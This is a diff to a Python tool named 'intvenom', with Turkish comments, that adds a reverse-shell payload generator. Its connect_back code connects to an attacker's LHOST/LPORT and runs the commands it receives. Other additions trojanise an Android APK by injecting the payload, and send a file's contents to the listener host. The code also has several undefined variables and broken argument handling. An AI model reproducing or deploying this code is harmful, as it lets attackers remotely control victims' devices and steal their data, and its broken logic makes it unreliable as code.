@@ -6,18 +6,109 @@ import subprocess
 import shutil
 import re
 from colorama import Fore, init
+import socket
+import os
+import argparse
+import zipfile
+import shutil
 
-parser = argparse.ArgumentParser(description="intvenom")
+def main():
+   print("""
+   ⠀⠀⢀⠤⠒⠒⠀⠒⠂⢄⡀⠀⠀⠀⠀⠀⠀
+⠀⡜⢀⠀⠀⠀⠀⠀⠀⢀⡈⢆⠀⠀⠀⠀⠀
+⠸⠀⠃⡄⠀⠀⠀⠀⠀⡸⢱⠀_ _ _ ___ _ _ ____ _ _ ____ _ _
+⡇⢸⠀⠀⠄⠀⠀⠀⠜⠀⠀⠂⠄| |\ | | | | |___ |\ | | | |\/|⠀⠀⠀
+⠇⢨⠀⠀⠈⢚⠸⠂⠀⠀⠀⡄⡄| | \| | \/ |___ | \| |__| |⠀⠀⠀⠀
+⠐⢆⢂⠀⠀⠈⠀⠢⢀⣀⢎⡄⠀⠀⠀⡀⠀
+⠰⡘⣷⢶⣿⣾⣧⣿⣶⠶⡻⣠⠃⠀⠀⠘⡄
+⠀⠑⣿⣄⣿⠾⠷⡟⠥⡴⠡⠃⠀⠀⢀⠔⡀
+⠀⠀⠘⢟⣷⣠⣄⡀⠀⠈⢇⠠⠂⠉⡠⠄⠀
+⠀⠀⠀⠘⠻⣿⠶⡟⣄⡀⠀⠀⢀⠎⠀⠀⠀
+⠀⠀⠀⠀⠑⠤⠠⠤⠃⠀⠉⠉⠀⠀
+    """)
+   global parser
+   parser = argparse.ArgumentParser(prog="intvenom", description="intvenom [options]")
+   parser.add_argument("start", nargs='?', help="intconsole Starter")
+   parser.add_argument("use", nargs='?', help="Exploit using command")
+   parser.add_argument("add", nargs='?', help="add a code")
+   parser.add_argument("LHOST", nargs='?', help="set a LHOST")
+   parser.add_argument("LPORT", nargs='?', help="set a LPORT")
+   parser.add_argument("-e", "--exploit", required=False, help="search exploit payload's")
+   parser.add_argument("-f", "--format", required=False, help="formatting")
+   parser.add_argument("-p", "--payload", required=False, help="occuring payload")
+   parser.add_argument("-o", "--output", required=False, help="set output")
+   parser.add_argument("-t", "--tools", required=False, help="Installing Tools")
+   parser.add_argument('-v', '--version', required=False, action='store_true', help="see version")
+   parser.add_argument("--original-apk", required=False, help="Path to the original APK file")
+   parser.add_argument("--output-apk", required=False, help="Path for the output APK file")
+   args = parser.parse_args()
 
-parser.add_argument("start", nargs='?', help="intconsole Starter")
-parser.add_argument("use", nargs='?', help="Exploit using command")
-parser.add_argument("add", nargs='?', help="add a code")
+main()
 
-parser.add_argument("-p", "--payload", required=False, help="search exploit payload's")
-parser.add_argument("-t", "--tools", required=False, help="Installing Tools")
-parser.add_argument('-v', '--version', required=False, action='store_true', help="see version")
+def create_payload(lhost, lport, output):
+    payload_content = f"""
+import socket
+import os
+import subprocess
 
-args = parser.parse_args()
+def get_ip():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return ip_address
+
+def connect_back(lhost, lport):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    ip = get_ip()
+    s.send(ip.encode('utf-8'))
+    while True:
+        command = s.recv(4096).decode('utf-8')
+        if command.lower() == "exit":
+            break
+        elif command.startswith("cd "):
+            try:
+                os.chdir(command[3:])
+                s.send(b"Changed directory")
+            except FileNotFoundError as e:
+                s.send(str(e).encode('utf-8'))
+        elif command == "camera":
+            # Kamera erişim kodu buraya eklenecek
+            s.send(b"Camera access is not implemented")
+        else:
+            output = subprocess.getoutput(command)
+            s.send(output.encode('utf-8'))
+    s.close()
+
+if __name__ == "__main__":
+    lhost = "{lhost}"
+    lport = {lport}
+    connect_back(lhost, lport)
+"""
+    with open(output, 'w') as payload_file:
+        payload_file.write(payload_content)
+    print(f"Payload created and saved as {output}")
+
+def create_apk_with_payload(original_apk, payload_file, output_apk):
+    temp_dir = "temp_apk"
+
+    with zipfile.ZipFile(original_apk, 'r') as zip_ref:
+        zip_ref.extractall(temp_dir)
+    
+    assets_dir = os.path.join(temp_dir, 'assets')
+    if not os.path.exists(assets_dir):
+        os.makedirs(assets_dir)
+    shutil.copy(payload_file, os.path.join(assets_dir, 'payload.py'))
+
+    with zipfile.ZipFile(output_apk, 'w') as new_zip:
+        for folder_name, subfolders, filenames in os.walk(temp_dir):
+            for filename in filenames:
+                file_path = os.path.join(folder_name, filename)
+                arcname = os.path.relpath(file_path, temp_dir)
+                new_zip.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir)
+    print(f"Payload injected and new APK saved as {output_apk}")
+    
 
 # Payload araştırma ve indirme fonksiyonu
 def search_and_download_payload(payload):
@@ -93,7 +184,7 @@ def execute_command(command):
         subprocess.run(command, shell=True, check=True)
     except subprocess.CalledProcessError as e:
         print(f"[!] Komut çalıştırılırken bir hata oluştu: {str(e)}")
-
+args = parser.parse_args()
 if args.start:
     os.system("intconsole") or os.system("python3 intconsoleV2.py")
 
@@ -179,9 +270,61 @@ def run_tool(tool_number):
 def runpy():
     init(autoreset=True)
     print(Fore.BLUE + "")
-    print("[+] Payload araştırma ve kullanma işlemi başlatılıyor...\n")
+    print("[+] Exploit araştırma ve kullanma işlemi başlatılıyor...\n")
     
-if args.payload:
+    
+def payloads():
+    global yol
+    yol = args.payload
+def LHOST():
+    global lhost
+    lhost = args.LHOST
+def LPORT():
+	global lport
+	lport = args.LPORT
+def output():
+	global output
+	output = args.o
+def format():
+    try:
+        # Dosyayı oku
+        with open(file_path, 'r', encoding='utf-8') as file:
+            content = file.read()
+
+        # Formatı kontrol et ve işle
+        if file_format == 'txt':
+            formatted_content = content  # Metin formatı için direkt içeriği al
+        elif file_format == 'json':
+            try:
+                json.loads(content)  # JSON formatını doğrula
+                formatted_content = content  # JSON ise içeriği direkt al
+            except ValueError as e:
+                print(f"[-] JSON formatı geçersiz: {e}")
+                return
+        else:
+            raise ValueError("Geçersiz dosya formatı!")
+
+        # Soket oluştur
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # Sunucuya bağlan
+        client_socket.connect((args.LHOST, args.LPORT))
+
+        # Dosya içeriğini gönder
+        client_socket.sendall(formatted_content.encode('utf-8'))
+
+        print(f"[+] Sended to '{args.LHOST}:{args.LPORT}' ")
+    except Exception as e:
+        print(f"[-] Hata oluştu: {e}")
+
+    finally:
+        # Soketi kapat
+        client_socket.close()
+    	
+    	
+    
+args = parser.parse_args()    
+if args.exploit:
    runpy()
    payload_path, is_safe = search_and_download_payload(args.payload)
    if payload_path and is_safe and args.use:
@@ -197,20 +340,16 @@ if args.add:
 if args.tools:
     	# Tools kurulum işlemi burada yapılacak
     	run_tool(args.tools)
+if args.LHOST and args.LPORT and  original_apk and output_apk:
+    Lhost = args.LHOST.split('=')[1].split()[0]
+    Lport = args.LPORT.split('=')[1].split()[0]
+    create_payload(Lhost, Lport, output_payload)
+    create_apk_with_payload(args.original_apk, output_payload, args.output_apk)
 
-# Ana işlem
-if __name__ == "__main__":
-    print("""
-   ⠀⠀⢀⠤⠒⠒⠀⠒⠂⢄⡀⠀⠀⠀⠀⠀⠀
-⠀⡜⢀⠀⠀⠀⠀⠀⠀⢀⡈⢆⠀⠀⠀⠀⠀
-⠸⠀⠃⡄⠀⠀⠀⠀⠀⡸⢱⠀_ _ _ ___ _ _ ____ _ _ ____ _ _
-⡇⢸⠀⠀⠄⠀⠀⠀⠜⠀⠀⠂⠄| |\ | | | | |___ |\ | | | |\/|⠀⠀⠀
-⠇⢨⠀⠀⠈⢚⠸⠂⠀⠀⠀⡄⡄| | \| | \/ |___ | \| |__| |⠀⠀⠀⠀
-⠐⢆⢂⠀⠀⠈⠀⠢⢀⣀⢎⡄⠀⠀⠀⡀⠀
-⠰⡘⣷⢶⣿⣾⣧⣿⣶⠶⡻⣠⠃⠀⠀⠘⡄
-⠀⠑⣿⣄⣿⠾⠷⡟⠥⡴⠡⠃⠀⠀⢀⠔⡀
-⠀⠀⠘⢟⣷⣠⣄⡀⠀⠈⢇⠠⠂⠉⡠⠄⠀
-⠀⠀⠀⠘⠻⣿⠶⡟⣄⡀⠀⠀⢀⠎⠀⠀⠀
-⠀⠀⠀⠀⠑⠤⠠⠤⠃⠀⠉⠉⠀⠀
-    """)
-    
+    os.remove(output_payload)
+if args.LHOST:
+	Lhost = args.LHOST.split('=')[1].split()[0]
+if args.LPORT:
+	Lport = args.LPORT.split('=')[1].split()[0]
+if args.format:
+	format()
